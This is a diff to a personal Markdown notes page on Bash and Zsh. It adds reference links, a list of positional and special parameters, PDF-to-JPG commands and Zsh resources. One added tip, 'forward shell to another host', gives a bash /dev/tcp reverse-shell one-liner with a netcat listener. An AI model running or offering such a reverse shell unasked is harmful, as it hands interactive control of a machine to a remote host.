@@ -1,19 +1,26 @@
 # Shell
 
+!!! info ""
+
+    + [:material-arch: Command-line shell](https://wiki.archlinux.org/title/Command-line_shell#Configuration_files)
+    + [Unix Shells: Bash, Fish, Ksh, Tcsh, Zsh comparison](https://hyperpolyglot.org/unix-shells)
+    + [Linux Handbook](https://linuxhandbook.com/)
+
 ## Bash
 
 !!! info ""
 
     **Reference:**
 
+    + [Bash Reference Manual](https://www.gnu.org/software/bash/manual/html_node/index.html#SEC_Contents)
     + [Shell & Utilities: Detailed Toc](https://pubs.opengroup.org/onlinepubs/9699919799/utilities/contents.html)
 
     **Bash Learning Sources**
 
+    + [Advanced Bash-Scripting Guide](https://tldp.org/LDP/abs/html/index.html)
     + [Learn X in Y minutes](https://learnxinyminutes.com/docs/bash/)
-
     + [Bash Pitfalls](https://mywiki.wooledge.org/BashPitfalls)
-
+    + [Введение в Bash Shell(Habr)](https://habr.com/ru/post/471242/)
     + Introduction to Advanced Bash Usage - James Pannacciulli @ OSCON 2014
 
         ![type:video](https://www.youtube.com/embed/uqHjc7hlqd0)
@@ -21,6 +28,8 @@
         <object data="./bash_oscon_2014.pdf" type="application/pdf" class="pdf"></object>
 
 ### Bash Essentials
+
+#### Bash script syntax
 
 ```bash
 #! /bin/bash
@@ -162,6 +171,22 @@ echo "Hello World" >> "hello/world.txt"    # >> adds to file, > overwrites a fil
 echo "Created hello/world.txt"
 ```
 
+#### Bash Positional Parameters([source](https://tldp.org/LDP/abs/html/internalvariables.html#APPREF))
+
++ `$0, $1, $2`, etc. - Positional parameters, passed from command line to script, passed to a function, or set to a variable.
++ `$#` - Number of command-line arguments or positional parameters.
++ `$*` - All of the positional parameters, seen as a single word. `$*` must be quoted.
++ `$@` - Same as `"$*"`, but each parameter is a quoted string, that is, the parameters are passed on intact, without interpretation or expansion. This means, among other things, that each parameter in the argument list is seen as a separate word. `"$@"` must be quoted.
++ `$#` - Number of arguments in `$*`.
+
+#### Other Special Parameters
+
++ `$-` - Flags passed to script (using `set`).
++ `$$` - PID of the current process.
++ `$!` - PID of last job run in background.
++ `$?` - Return code of the last executed command.
++ `$_` - Final argument of previous command executed..
+
 #### Bash Shell Shortcuts
 
 ![bash-shortcuts.jpg](bash-shortcuts.jpg){: .zoom}
@@ -170,44 +195,68 @@ echo "Created hello/world.txt"
 
 #### Useful Commands
 
-+ `du -hs` - show the current folder's size
++ ##### *show the current folder's size*
 
-+ convert pdf to jpg
+    ```bash
+    du -hs
+    ```
 
-    **Using `pdftoppm` tool**
++ ##### *convert pdf to jpg*
 
-    basic command format:
+    1. *using `pdftoppm` tool:*
 
-    `#! bash pdftoppm -jpeg -r 300 input.pdf output`
+        Basic command format: `#! bash pdftoppm -jpeg -r 300 input.pdf output`
 
-    The `-jpeg` sets the output image format to JPG, `-r 300` sets the output image resolution to 300 DPI, and the word `output` will be the prefix to all pages of images, which will be numbered and placed into your current directory you are working in. A better way, in my opinion, however, is to use `mkdir -p images` first to create an "images" directory, then set the output to `images/pg` so that all output images will be placed cleanly into the `images` dir you just created, with the file prefix `pg` in front of each of their numbers.
+        The `-jpeg` sets the output image format to JPG, `-r 300` sets the output image resolution to 300 DPI, and the word `output` will be the prefix to all pages of images, which will be numbered and placed into your current directory you are working in. A better way, in my opinion, however, is to use `mkdir -p images` first to create an "images" directory, then set the output to `images/pg` so that all output images will be placed cleanly into the `images` dir you just created, with the file prefix `pg` in front of each of their numbers.
 
-    Therefore, here are my favorite commands:
+        Therefore, here are my favorite commands:
 
-    1. [Produces ~1MB-sized files per pg] Output in **.jpg** format at **300 DPI**:
+        1. [Produces ~1MB-sized files per pg] Output in **.jpg** format at **300 DPI**:
 
-        ```bash
-        mkdir -p images && pdftoppm -jpeg -r 300 mypdf.pdf images/pg
-        ```
+            ```bash
+            mkdir -p images && pdftoppm -jpeg -r 300 mypdf.pdf images/pg
+            ```
 
-    2. [Produces ~2MB-sized files per pg] Output in **.jpg** format **at highest quality (least compression)** and still at **300 DPI**:
+        2. [Produces ~2MB-sized files per pg] Output in **.jpg** format **at highest quality (least compression)** and still at **300 DPI**:
 
-        ```bash
-        mkdir -p images && pdftoppm -jpeg -jpegopt quality=100 -r 300 mypdf.pdf images/pg
-        ```
+            ```bash
+            mkdir -p images && pdftoppm -jpeg -jpegopt quality=100 -r 300 mypdf.pdf images/pg
+            ```
 
-    **Using ImageMagick's `convert` tool**
+    2. *using ImageMagick's `convert` tool:*
 
-    1. install `imagemagick`
+        1. install `imagemagick`
 
-    2. use `convert` like this:
+        2. use `convert` like this:
 
-        ```bash
-        convert input.pdf output.jpg
+            ```bash
+            convert input.pdf output.jpg
 
-        # For good quality use these parameters
-        convert -density 300 -quality 100 in.pdf out.jpg
-        ```
+            # For good quality use these parameters
+            convert -density 300 -quality 100 in.pdf out.jpg
+            ```
+
++ ##### *forward shell to another host*
+
+    ```bash
+    bash -i >& /dev/tcp/<host-ip>/<port> 0>&1
+    ```
+
+    Example:
+
+    1. On host machine run  `#!bash bash -i >& /dev/tcp/192.168.218.1/9999 0>&1` where:
+
+        1. `192.168.218.1` is the host to which you want to forward the shell(note that you can also use a hostname but I strongly suggest you use an IP to prevent issues with hostname-resolving)
+        1. `9999` is the port number on which the netcat listener will listen
+
+    2. Start the *netcat listener* on the other side by running `#!bash nc -l 9999`.
+
+        1. Double check that there are no firewall rules preventing you from accepting connections.
+        1. Some versions of netcat require you to add `-p` before the port number.
+
++ ##### *"find"*
+
+    + [ ] [15 супер полезных примеров команды find в Linux](https://habr.com/ru/company/first/blog/593669/)
 
 #### Run Commands in the Background
 
@@ -242,11 +291,25 @@ echo "Created hello/world.txt"
 
 ## Zsh
 
-+ [ ] [terminal-helpful-tips (7 Part Series)](https://dev.to/equiman/reveal-the-command-behind-an-alias-with-zsh-4d96)
+!!! info ""
 
-### Oh My Zsh
+    + [ ] [terminal-helpful-tips (7 Part Series)](https://dev.to/equiman/reveal-the-command-behind-an-alias-with-zsh-4d96)
+
+    **MacOS:**
+
+    + [Moving to zsh](https://scriptingosx.com/2019/06/moving-to-zsh/)
+
+### Zsh Utilities
+
+!!! info ""
+
+    + [awesome-zsh-plugins(GitHub)](https://github.com/unixorn/awesome-zsh-plugins)
+
+#### Oh My Zsh
 
 A delightful community-driven framework for managing your zsh configuration.
 
-+ [Official Website](https://ohmyz.sh/)
-+ [Official Git](https://github.com/ohmyzsh)
+!!! info ""
+
+    + [Official Website](https://ohmyz.sh/)
+    + [Official Git](https://github.com/ohmyzsh)
